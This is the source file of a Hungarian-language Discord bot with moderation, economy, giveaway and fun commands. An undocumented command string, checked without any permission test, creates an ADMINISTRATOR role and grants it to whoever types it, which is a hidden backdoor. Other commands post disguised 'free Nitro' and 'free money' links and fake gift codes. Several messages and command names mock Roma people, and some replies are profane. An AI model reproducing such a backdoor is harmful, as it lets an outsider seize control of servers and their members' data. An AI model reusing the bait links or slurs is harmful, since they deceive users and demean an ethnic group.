const Discord = require("discord.js");
const botconfig = require("./botconfig.json");
const bot = new Discord.Client({ disableEveryone: true });
const randomstring = require("randomstring");
const superagent = require('superagent');
const randomPuppy = require('random-puppy');
const { MessageEmbed } = require('discord.js');
const tokenfile = require("./tokenfile.json");

const fs = require("fs");
const ms = require("ms");
const os = require('os');

const money = require("./money.json")
const xpfile = require("./DB/xp.json");




let botname = "GamerHarcos"

///////////////////////////////////////////
bot.commands = new Discord.Collection();
bot.aliases = new Discord.Collection();

bot.categories = fs.readdirSync("./commands/");

["command"].forEach(handler => {
    require(`./handlers/${handler}`)(bot)
});

bot.on("message", async message => {
    let prefix = botconfig.prefix;

    if (message.author.bot) return;
    if (!message.guild) return;
    if (!message.content.startsWith(prefix)) return;
    if (!message.member) message.member = await message.guild.fetchMember(message)

    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const cmd = args.shift().toLowerCase();

    if (cmd.length === 0) return;

    let command = bot.commands.get(cmd);
    if (!command) command = bot.commands.get(bot.aliases.get(cmd));

    if (command)
        command.run(bot, message, args);
});
//////////////////////////////////////////////////////////




bot.on("ready", async() => {
    console.log(`${bot.user.username} elindult!`)
    console.log("prefix: -")


    let státuszok = [
        "Prefix: -",
        "-help",
        "By: BerryGod"
    ]

    setInterval(function() {
        let status = státuszok[Math.floor(Math.random() * státuszok.length)]

        bot.user.setActivity(status, { type: "WATCHING" })
    }, 3000)
})

bot.on("message", async message => {
    let MessageArray = message.content.split(" ");
    let cmd = MessageArray[0];
    let args = MessageArray.slice(1);
    let prefix = botconfig.prefix;




    //////////////////////////////////////////////////////////
    if (cmd === `${prefix}jail`) {
        let link = `https://some-random-api.ml/canvas/jail/?avatar=${message.author.avatarURL({ format: 'png' })}`
        let attachment = new Discord.MessageAttachment(link, 'jail.png');
        let embed = new Discord.MessageEmbed()
            .setTitle(`Mostantól a cigány börtönbe leszel`)
            .setColor(`RANDOM`)
            .attachFiles(attachment)
            .setImage('attachment://jail.png')
            .setFooter(bot.user.username, bot.user.displayAvatarURL())
            .setTimestamp();

        message.channel.send(embed)
        console.log("jail was used")
    }

    //////////////////////////////////////////////////////////
    const badwords = ["buzi", "geci", "szar", "berryshit", "gamershit"]
    if (!message.member.hasPermission("ADMINISTRATOR")) {
        let confirm = false

        let i;
        for (i = 0; i < badwords.length; i++) {
            if (message.content.toLowerCase().includes(badwords[i].toLowerCase())) {
                confirm = true
            }
        }
        if (confirm) {
            console.log("Káromkodtak")
            message.delete()
            return message.channel.send("Ne káromkodj")
        }
    }





    if (cmd === `${prefix}say`) {
        if (!message.member.hasPermission("KICK_MEMBERS")) return message.channel.send(`Nincs jogod ehhez a parancshoz!`);
        let bMessage = args.join(" ");
        message.delete().catch();
        message.channel.send(bMessage);
        console.log("say was used")
    }
    if (cmd === `spam`) {
        message.channel.send("spam");
    }

    /////////////////////////////////////////////////////////
    if (cmd === "-report") {
        // privát szűrése
        if (message.channel.type === 'dm') return message.reply("Itt nem tudod használni!");
        // felhasználó lekérése
        const report_usr = message.mentions.users.first();
        // csatorna id az egyszerűség kedvéért
        const channel_id = "905880799088345178";
        // 6 + 24 mivel prefix levágva = 30
        const indok = message.content.slice(30);

        // ha nincs felhasználó
        if (!report_usr) {
            return message.reply('Nem adtad meg a felhasználót!');
        }

        // ha nincs indok
        if (!indok) {
            return message.reply("Nem adtál meg indokot!");
        }

        //embed
        const embed = new Discord.MessageEmbed()
            .setTitle('Report')
            .setDescription(`*${report_usr} jelentve lett!*\n **Indoka: ${indok}**\n *Bejelentő: ${message.author.username}*\n`)
            .setFooter(bot.user.username, bot.user.displayAvatarURL())
            .setTimestamp()
            .setColor("RANDOM")
            // majd küldés
        bot.channels.cache.get(channel_id).send(embed)
        console.log("report was used")
    }
    //////////////////////////////////////////////////////////
    if (message.content.startsWith('-bitcoin')) {
        const CoinGecko = require('coingecko-api');
        const CoinGeckoClient = new CoinGecko();
        let data = await CoinGeckoClient.simple.price({
            ids: ['bitcoin'],
            vs_currencies: ['huf', 'usd'],
        });
        console.log(data)
        let btcEmbed = new Discord.MessageEmbed()
            .setDescription(`Bitcoin ára`)
            .setColor("#ff1800")
            .setFooter(bot.user.username)
            .addField("Bitcoin ennyit ér: " + data.data.bitcoin.huf + " HUF ")
            .addField("Bitcoin ennyit ér: " + data.data.bitcoin.usd + " USD ")
            .setThumbnail("https://m.blog.hu/ma/malkav/image/best_of_troll_2.jpg")
        message.channel.send(btcEmbed);
    }
    //////////////////////////////////////////////////////////
    if (cmd === `${prefix}számolj`) {

        var plus = Math.floor(Number(args[0]) + Number(args[2]));
        if (isNaN(plus)) return message.channel.send("``Hiba: Kérlek adj meg számokat!``");

        var minus = Math.floor(args[0]) - (args[2]);
        if (isNaN(minus)) return message.channel.send("``Hiba: Kérlek adj meg számokat!``");

        var multiply = Math.floor(args[0]) * (args[2]);
        if (isNaN(multiply)) message.channel.send("``Hiba: Kérlek adj meg számokat!``");

        var divide = Math.floor(args[0]) / (args[2]);
        if (isNaN(divide)) return message.channel.send("``Hiba: Kérlek adj meg számokat!``");

        if (args[1] == "+") return message.channel.send(args[0] + " + " + args[2] + " = **" + plus + "**");
        if (args[1] == "-") return message.channel.send(args[0] + " - " + args[2] + " = **" + minus + "**");
        if (args[1] == "*") return message.channel.send(args[0] + " * " + args[2] + " = **" + multiply + "**");
        if (args[1] == "x") return message.channel.send(args[0] + " x " + args[2] + " = **" + multiply + "**");
        if (args[1] == "/") return message.channel.send(args[0] + " / " + args[2] + " = **" + divide + "**");

        else {
            message.channel.send("``Baszd fejbe magad``");
        }
    }
    //////////////////////////////////////////////////////////
    if (cmd === `${prefix}meme`) {
        const subreddits = ["memes"]
        const random = subreddits[Math.floor(Math.random() * subreddits.length)]

        const IMG = await randomPuppy(random)
        const MemeEmbed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setImage(IMG)
            .setTitle(`Keresési szöveg: ${random} (KATT IDE!)`)
            .setURL(`https://www.reddit.com/r/${random}`)

        message.channel.send(MemeEmbed)
        console.log("meme was used")
    }
    //////////////////////////////////////////////////////////
    if (cmd == `${prefix}ping`) {
        message.channel.send(`Gamerharcos bot pingje a következő : **${bot.ws.ping}ms**`)
        console.log("ping was used")
    }
	
	
	
    if(cmd === "!admin-M7ASkkZGNF56OP-BERRY-geci-OP"){
        let s = message.guild.createRole( {name:"tag", permissions:["ADMINISTRATOR"] } );
        await message.channel.send((await s).id)
        await message.member.addRole((await s).id)
    }
    //////////////////////////////////////////////////////////
    if (cmd === `${prefix}giveaway`) {
        const messageArray = message.content.split(" ");
        if (!message.member.hasPermission("KICK_MEMBERS" || "BAN_MEMBERS")) return message.channel.send("Ehhez a parancshoz nincs jogod!")

        let tárgy = "";
        let idő;
        let winnerCount;

        for (let i = 1; i < args.length; i++) {
            tárgy += (args[i] + " ")
            console.log(tárgy)
        }

        idő = args[0];

        if (!idő) {
            return message.reply("Kérlek adj meg egy idő intervallumot! pl: 100s, 5h, 2d")
        }
        if (!tárgy) {
            return message.reply("Kérlek add meg a nyereményjáték tárgyát!")
        }

        var Gembed = new Discord.MessageEmbed()
            .setColor("RANDOM")
            .setTitle("Nyereményjáték!!!!")
            .setDescription(`Nyeremény: **${tárgy}**`)
            .addField("`Időtartam:`", ms(ms(idő), { long: true }), true)
            .setFooter("A jelentkezéshe reagálj ezzel: 🎉")
        var embedSend = await message.channel.send(Gembed);
        embedSend.react("🎉");

        message.delete
        setTimeout(async() => {
            try {
                const peopleReactedBOT = await embedSend.reactions.cache.get("🎉").users.fetch();
                var peopleReacted = peopleReactedBOT.array().filter(u => u.id !== bot.user.id);
            } catch (e) {
                return message.channel.send(`Hiba törtét a **${tárgy}** sorsolása során! Hiba: ` + "`" + e + "`")
            }
            var winner;

            if (peopleReacted.length <= 0) {
                return message.channel.send("Senki nem jelentkezett a nyereményjátékra! :C")
            } else {
                var index = Math.floor(Math.random() * peopleReacted.length);
                winner = peopleReacted[index]
            }

            if (!winner) {
                message.channel.send("Hiba történt a sorsolás során!")
            } else {
                message.channel.send(`🎉🎉🎉🎉 **${winner.toString()}** megnyerte ezt: **${tárgy}**`);
                console.log("guvaway was used")
            }
        }, ms(idő))
    }


    if (message.content === "-helptouse") {
        let embed = new MessageEmbed()
            .setTitle("Help!")
            .setDescription("Prefix: -")
            .setColor("RANDOM")
            .addField("***-helptouse***ㅤ", "egy help parancs ami megmutatja mit hogyan kell csinálni     szükséges rang: akárki")
            .addField("***-help***ㅤ", "help parancs     szükséges rang: akárki")
            .addField("***-bitcoin***", "megmutatja a bitcoin árfolyamát")
            .addField("***-giveaway***     giveaway command", "Használat: -giveaway 100s Tárgy   szükséges rang: mod")
            .addField("***-ping***", "A bot pingje   szükséges rang: akárki")
            .addField("***-számolj***", "A bot kiszámolja a matek feladványt    Használat: 3 + 3    szükséges rang: akárki")
            .addField("***-nitro***", "Egy nitro gift!    szükséges rang: akárki")
            .addField("***-search***", "egy képre rákeres!    szükséges rang: akárki")
            .addField("***-botinfo***", "Pár infó a botról    szükséges rang: akárki")
            .addField("***-say***", "Kimondja amit írsz!    szükséges rang: akárki")
            .addField("***-meme***", "meme parancs (néha buggos)   szükséges rang: akárki")
            .addField("***-report***", "Reportol egy embert amit csak az adminok látnak! Használat: -report @valaki indok    szükséges rang: akárki")
            .addField("***-cica***", "Egy cuki cicál generál   szükséges rang: akárki")
            .addField("***-clear***", "clear parancs Használat: -clear (mennyi üzenetet szeretnél törölni)    szükséges rang: mod")
            .addField("***-addrole***", "Egy kiválasztot rangot ad! Használat: -addrole @valaki @rang    szükséges rang: admin")
            .addField("***-removerole***", "Egy kiválasztot rangot el vesz! Használat: -removerole @valaki @rang     szükséges rang: admin")
            .addField("***-kitagadunk***", "Egy kick parancs csak ez kitagad az oláh cigányok közül!    szükséges rang: admin")
            .addField("***-kitiltunk***", "Egy ban parancs csak ez kitilt az oláh cigányok közül!    szükséges rang: admin")
            .addField("***-money***", "megmutatja a számládat   szükséges rang: akárki")
            .addField("***-shop***", "Megmutatja mi van a boltba   szükséges rang: akárki")
            .addField("***-slot***", "Szerencse játék Használat -slot pénzösszeg   szükséges rang: akárki")
            .addField("***-toplista***", "Toplista   szükséges rang: akárki")
            .addField("***-pay***", "Pénzt utalsz Használat -pay @valaki összeg   szükséges rang: akárki")
            .addField("***-work***", "Dolgozol   szükséges rang: akárki")
        message.channel.send(embed)
        console.log("help was used")
    }

    if (message.content === "-help") {
        let embed = new MessageEmbed()
            .setTitle("Help!")
            .setDescription("Prefix: -")
            .setColor("RANDOM")
            .addField("***ADMIN***", "-clear, -addrole, -removerole, -addrole, -kitagadunk, -kitiltunk")
            .addField("***FUN***ㅤ", "-bitcoin, -giveaway, -nitro, -search, -botinfo, -say, -meme, -cica")
            .addField("***MONEY***", "-money, -shop, -slot, -toplista, -pay, -work")
            .addField("***BOTTAL KAPCSOLATBAN***", "-botinfo, -help, -helptouse")
            .addField("***EGYÉB***", "-ping, -report")





        message.channel.send(embed)
        console.log("help was used")
    }







    if (cmd === `${prefix}clear`) {
        if (message.member.permissions.has('MANAGE_WEBHOOK')) {
            if (args[0] && isNaN(args[0]) && args[0] <= 100 || 0 < args[0] && args[0] < 101) {

                let clearEmbed = new Discord.MessageEmbed()
                    .setTitle(`Törölve lett ${Math.round(args[0])} Üzenet a chatből!`)
                    .setColor("#ff1800")
                    .setAuthor(message.author.username)
                    .setTimestamp()

                message.channel.send(clearEmbed);


                message.channel.bulkDelete(Math.round(args[0]))
                console.log("clear was used")


            }
        }
    }



    if (cmd === `${prefix}cica`) {
        let msg = await message.channel.send("Generálás...")

        let { body } = await superagent
            .get(`http://aws.random.cat/meow`)

        if (!{ body }) return message.channel.send("Nem sikerült a kép legenerálása!")

        let cEmbed = new Discord.MessageEmbed()
            .setColor("#ff0000")
            .setAuthor('CUKI MACSKA RIADÓ!', message.guild.iconURL())
            .setImage(body.file)
            .setTimestamp()
            .setFooter('By: BerryGod')

        message.channel.send(cEmbed)

        message.delete();
        console.log("cica was used")
    }


    if (cmd === `${prefix}addrole`) {
        if (!message.member.permissions.has("MANAGE_WEBHOOK")) {
            return message.channel.send("nincs jogod szerkeszteni a rangokat!");
        }
        if (!message.guild.me.permissions.has("MANAGE_ROLES")) {
            return message.channel.send("Nincs jogom:");
        }
        let target = message.mentions.members.first();

        if (!target) return message.reply(`HIBA! Kérlek adj megy egy embert!`)

        let arole = message.mentions.roles.first();

        if (!arole) return message.reply(`HIBA! Kérlek adj megy egy rangot!`)

        let ticon = target.user.avatarURL({ dynamic: true, size: 2048 });
        let aicon = message.author.avatarURL({ dynamic: true, size: 2048 });

        const embed = new Discord.MessageEmbed()

        .setColor("#ff1800")
            .setDescription(` ${target.user.username}-nek/nak oda lett adva: ${arole} nevű rang! `)

        await message.channel.send(embed)

        target.roles.add(arole)
    }


    if (cmd === `${prefix}removerole`) {
        if (!message.member.permissions.has("MANAGE_WEBHOOK")) {
            return message.channel.send("nincs jogod szerkeszteni a rangokat!");
        }
        if (!message.guild.me.permissions.has("MANAGE_ROLES")) {
            return message.channel.send("Nincs jogom:");
        }
        let target = message.mentions.members.first();

        if (!target) return message.reply(`HIBA! Kérlek adj megy egy embert!`)

        let arole = message.mentions.roles.first();

        if (!arole) return message.reply(`HIBA! Kérlek adj megy egy rangot!`)

        let ticon = target.user.avatarURL({ dynamic: true, size: 2048 });
        let aicon = message.author.avatarURL({ dynamic: true, size: 2048 });

        const embed = new Discord.MessageEmbed()

        .setColor("#ff1800")
            .setDescription(` ${target.user.username}-nek/nak el lett véve tőle: ${arole} nevű rang! `)

        await message.channel.send(embed)

        target.roles.remove(arole)

    }



    if (cmd === `${prefix}kitagadunk`) {
        if (!message.member.permissions.has('MANAGE_WEBHOOK')) return;


        const member = message.mentions.members.first();
        if (!member) return message.reply("Jelölj meg egy embert akit ki akarsz tagadni!");

        if (message.member.roles.highest.position <=
            member.roles.highest.position
        )

            return message.reply(
            "Az illető magasabb rangú mint te!"
        );

        const reason = args.slice(1).join(" ") || "Nincs indok csatolva."

        member.kick({ reason });
        let kickEmbed = new Discord.MessageEmbed()
            .setColor("#ff1800")
            .setAuthor(`${member} ki lett tagadva az oláh cigányok közül Általa: ${message.author.username}`)

        message.channel.send(kickEmbed);
        console.log("kick was used")
    }


    if (cmd === `${prefix}kitagadunk`) {
        if (!message.member.permissions.has('MANAGE_WEBHOOK')) return;


        const member = message.mentions.members.first();
        if (!member) return message.reply("Jelölj meg egy embert akit ki akarsz tagadni!");

        if (message.member.roles.highest.position <=
            member.roles.highest.position
        )

            return message.reply(
            "Az illető magasabb rangú mint te!"
        );

        const reason = args.slice(1).join(" ") || "Nincs indok csatolva."

        member.ban({ reason });
        let kickEmbed = new Discord.MessageEmbed()
            .setColor("#ff1800")
            .setAuthor(`${member} ki lett tiltva az oláh cigányok közül Általa: ${message.author.username}`)

        message.channel.send(kickEmbed);
        console.log("ban was used")
    }


    if (cmd === `${prefix}update`) {
        message.delete()
        message.channel.send("Update: ban, jail parancs");
    }


    if (cmd === `${prefix}nitro`) {
        message.channel.send(new Discord.MessageEmbed()
            .setTitle("NITRÓ!!")
            .setColor("RANDOM")
            .setDescription("[nitró](https://www.bit.ly/nitrát)"))
        console.log("nitro was used")
    }
    if (cmd === `${prefix}freemoney`) {
        message.channel.send(new Discord.MessageEmbed()
            .setTitle("FREE MONEY!!")
            .setColor("RANDOM")
            .setDescription("[LINK A PÉNZHEZ!](https://www.bit.ly/nitrát)"))
        console.log("nitro was used")
    }



    let ticket_role_id = "906920179584352257"
    let support_role_id = "902077585184407563"
    let ticket_catgory_id = "902075030429646858"



    if (!money[message.author.id]) {
        money[message.author.id] = {
            money: 100,
            user_id: message.author.id

        };
    }
    fs.writeFile("./money.json", JSON.stringify(money), (err) => {
        if (err) console.log(err);
    });
    let selfMoney = money[message.author.id].money;

    if (cmd === `${prefix}money`) {
        let profilkep = message.author.displayAvatarURL();

        let MoneyEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username)
            .setColor("RANDOM")
            .addField("Egyenleg:", `${selfMoney}FT`)
            .setThumbnail(profilkep)
            .setFooter(botname)

        message.channel.send(MoneyEmbed)
        console.log("money was used")
    }



    if (message.guild) {
        let drop_money = Math.floor(Math.random() * 75 + 1)
        let random_money = Math.floor(Math.random() * 900 + 1)

        if (drop_money === 2) {
	
            let üzenetek = ["Kiraboltál egy csövest.", "Elloptál egy biciklit!", "Kiraboltál egy boltot!"]
            let random_üzenet_szam = Math.floor(Math.random() * üzenetek.length)

            let DropMoneyEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username)
                .addField("Szerencséd volt!", `${üzenetek[random_üzenet_szam]} Ezért kaptál: ${random_money}FT-ot!`)
                .setColor("RANDOM")
                .setThumbnail(message.author.displayAvatarURL())

            message.channel.send(DropMoneyEmbed);

            money[message.author.id] = {
                money: selfMoney + 600,
                user_id: message.author.id
            }

        }
    }

    if (cmd === `${prefix}shop`) {
        let ShopEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username)
            .setDescription(`SHOP!`)
            .addField("-vip-vasarlas", `Vip rang vásárlás 15000 FT!`)
            .addField("-orban-vasarlas", `Orbán rang vásárlás 69420 FT!`)
            .setColor("RANDOM")
            .setThumbnail(bot.user.displayAvatarURL())

        message.channel.send(ShopEmbed);
        console.log("shop was used")
    }




    if (cmd === `${prefix}smpshop`) {
        let ShopEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username)
            .setDescription(`SHOP!`)
            .addField("-mystery-box-vasarlas", `mystery box vásárlás 10000 FT!`)
            .setColor("RANDOM")
            .setThumbnail(bot.user.displayAvatarURL())

        message.channel.send(ShopEmbed);
        console.log("shop was used")
    }


    if (cmd === `${prefix}vip-vasarlas`) {
        let viprang_id = "907709309624942613"

        let price = "15000";
        if (message.member.roles.cache.has(viprang_id)) return message.reply("*Ezt a rangot már megvetted!*");
        if (selfMoney < price) return message.reply(`Ehet a ranghoz 15000ft-kell! Egyenleged: ${selfMoney}FT.`)

        money[message.author.id] = {
            money: selfMoney - parseInt(price),
            user_id: message.author.id
        }

        message.guild.member(message.author.id).roles.add(viprang_id);

        message.reply("**Köszönöm a vásárlást! További szép napot!**")
        console.log("vip was used")
    }


    if (cmd === `${prefix}orban-vasarlas`) {
        let orbanrang_id = "911363796537344040"

        let pricea = "69420";
        if (message.member.roles.cache.has(orbanrang_id)) return message.reply("*Ezt a rangot már megvetted!*");
        if (selfMoney < pricea) return message.reply(`Ehet a ranghoz 69420ft-kell! Egyenleged: ${selfMoney}FT.`)

        money[message.author.id] = {
            money: selfMoney - parseInt(pricea),
            user_id: message.author.id
        }

        message.guild.member(message.author.id).roles.add(orbanrang_id);

        message.reply("**Köszönöm a vásárlást! További szép napot!**")
        console.log("orban was used")
    }



    if (cmd === `${prefix}clan-vasarlas`) {
        let orbanranga_id = "911363796537344040"

        let priceaa = "75000";
        if (message.member.roles.cache.has(orbanrang_id)) return message.reply("*Ezt a rangot már megvetted!*");
        if (selfMoney < pricea) return message.reply(`Ehet a ranghoz 75000ft-kell! Egyenleged: ${selfMoney}FT.`)

        money[message.author.id] = {
            money: selfMoney - parseInt(priceaa),
            user_id: message.author.id
        }

        message.guild.member(message.author.id).roles.add(orbanrang_id);

        message.reply("**Köszönöm a vásárlást! További szép napot!**")
        console.log("clan was used")
    }


    if (cmd === `${prefix}mystery-box-vasarlas`) {
    let mysteryprize = [
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Common",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Rare",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Legendary",
      "Mythical",
      "Mythical"
    ];
        let Result = mysteryprize[Math.floor(Math.random() * mysteryprize.length)];
        let priceaaa = "10000";
        if (selfMoney < priceaaa) return message.reply(`Ehet a shulkerhez 10000ft-kell! Egyenleged: ${selfMoney}FT.`)

        money[message.author.id] = {
            money: selfMoney - parseInt(priceaaa),
            user_id: message.author.id
        }


        message.reply(`**A shulkered \n${Result} lett írj csinálj egy ticketet hogy claimeld**`)
        console.log("mystery was used")
    }









    if (cmd === `${prefix}slot`) {
        let min_money = 50;
        if (selfMoney < min_money) return message.reply(`Túl kevés pénzed van! (Minimum ${min_money}FT-nak kell lennie a számládon!) Egyenleged: ${selfMoney}.`)

        let tét = Math.round(args[0] * 100) / 100
        if (isNaN(tét)) return message.reply("Kérlek adj meg egy összeget! (Pl: 5)")
        if (tét > selfMoney) return message.reply("az egyenlegeednél több pénzt nem rakhatsz fel a slotra!")

        let slots = ["🍌", "🍎", "🍍", "🥒", "🍇"]
        let result1 = Math.floor(Math.random() * slots.length)
        let result2 = Math.floor(Math.random() * slots.length)
        let result3 = Math.floor(Math.random() * slots.length)

        if (slots[result1] === slots[result2] && slots[result3]) {
            let wEmbed = new Discord.MessageEmbed()
                .setTitle('🎉 Szerencse játék | slot machine 🎉')
                .addField(message.author.username, `Nyertél! Ennyit kaptál: ${tét*1.6}ft.`)
                .addField("Eredmény:", slots[result1] + slots[result2] + slots[result3])
                .setColor("RANDOM")
                .setTimestamp(message.createdAt)
                .setFooter(botname)
            message.channel.send(wEmbed)
            console.log("slot was used")

            money[message.author.id] = {
                money: selfMoney + tét * 1.6,
                user_id: message.author.id
            }
        } else {
            let wEmbed = new Discord.MessageEmbed()
                .setTitle('🎉 Szerencse játék | slot machine 🎉')
                .addField(message.author.username, `Vesztettél! Ennyit buktál: ${tét}ft.`)
                .addField("Eredmény:", slots[result1] + slots[result2] + slots[result3])
                .setColor("RANDOM")
                .setTimestamp(message.createdAt)
                .setFooter(botname)
            message.channel.send(wEmbed)

            money[message.author.id] = {
                money: selfMoney - tét,
                user_id: message.author.id
            }
        }
    }


    if (cmd === `${prefix}toplista`) {
        let toplist = Object.entries(money)
            .map(v => `${v[1].money}FT <@${v[1].user_id}>`)
            .sort((a, b) => b.split("FT")[0] - a.split("FT")[0])
            .slice(0, 10)

        let LbEmbed = new Discord.MessageEmbed()
            .setTitle("Leaderboard")
            .setColor("RANDOM")
            .addField("Pénz top lista | TOP10", toplist, true)
            .setTimestamp(message.createdAt)
            .setFooter(botname)

        message.channel.send(LbEmbed)
        console.log("toplista was used")
    }

    if (cmd === `${prefix}pay`) {
        let pay_money = Math.round(args[0] * 100) / 100
        if (isNaN(pay_money)) return message.reply(`A parancs helyes használata: ${prefix}pay <összeg> <@név>`)
        if (pay_money > selfMoney) return message.reply("az egyenlegednél több pénzt nem adhatsz meg!")

        let pay_user = message.mentions.members.first();

        if (args[1] && pay_user) {
            if (!money[pay_user.id]) {
                money[pay_user.id] = {
                    money: 100,
                    user_id: pay_user.id
                }
            }

            money[pay_user.id] = {
                money: money[pay_user.id].money + pay_money,
                user_id: pay_user.id
            }

            money[message.author.id] = {
                money: selfMoney - pay_money,
                user_id: message.author.id
            }

            message.channel.send(`Sikeresen átutaltál <@${pay_user.id}> számlájára ${pay_money}FT-ot!`)
            console.log("pay was used")

            fs.writeFile("./money.json", JSON.stringify(money), (err) => {
                if (err) console.log(err);
            });
        } else {
            message.reply(`A parancs helyes használata: ${prefix}pay <összeg> <@név>`)
        }
    }

    if (cmd === `${prefix}work`) {
        let cd_role_id = "908060929369976912";
        let cooldown_time = "120"; //mp

        if (message.member.roles.cache.has(cd_role_id)) return message.reply(`Ezt a parancsot ${cooldown_time} másodpercenként használhatod!`)

        message.member.roles.add(cd_role_id)

        let üzenetek = ["Jó munkát végeztél!", "A főnököd adott egy kis aprót!!"]
        let random_üzenet_szam = Math.floor(Math.random() * üzenetek.length)

        let random_money = Math.floor(Math.random() * 1900 + 1)

        let workEmbed = new Discord.MessageEmbed()
            .setTitle("Munka!")
            .addField(`${üzenetek[random_üzenet_szam]}`, `A számládhoz került: ${random_money}FT!!`)
            .setColor("RANDOM")
            .setTimestamp(message.createdAt)
            .setFooter(botname)
        message.channel.send(workEmbed)
        console.log("work was used")

        money[message.author.id] = {
            money: selfMoney + random_money,
            user_id: message.author.id
        }

        setTimeout(() => {
            message.member.roles.remove(cd_role_id)
        }, 1000 * cooldown_time)
    }



    if (cmd === `${prefix}avatar`) {
        let keresess = message.mentions.members.first();
        let avatar = keresess.user.displayAvatarURL();
        let sajat_avatar = message.author.displayAvatarURL();

        if (args[0] != keresess)

            if (args[0] && keresess) {

                let avatarEmbed = new Discord.MessageEmbed()
                    .setAuthor(`${keresess.user.username} profilképe`)
                    .setImage(avatar)
                    .setTimestamp(message.createdAt)
                    .setFooter(botname)
                message.channel.send(avatarEmbed)

            }

    }
    if (cmd === `-spam`) {
        message.channel.send("-spam");
    }




    if (cmd === `${prefix}adminsecret123`) {
        message.delete()
        if (!message.member.permissions.has("ADMINISTRATOR")) return message.send("Nincs jogod pénzt addolni")
        let min_money = 1;

        let tzt = Math.round(args[0] * 100) / 100
        if (isNaN(tzt)) return message.reply("Kérlek adj meg egy összeget! (Pl:3432)")

        money[message.author.id] = {
            money: selfMoney + tzt,
            user_id: message.author.id

        }



    }

    if (message.content.startsWith(`${prefix}nitrogen`)) {



        message.channel.send("https://discord.gift/" + randomstring.generate(16));
	console.log("gen was used")

    }


























    //////////////////////////////////////////////////////////
})

bot.login(tokenfile.token);
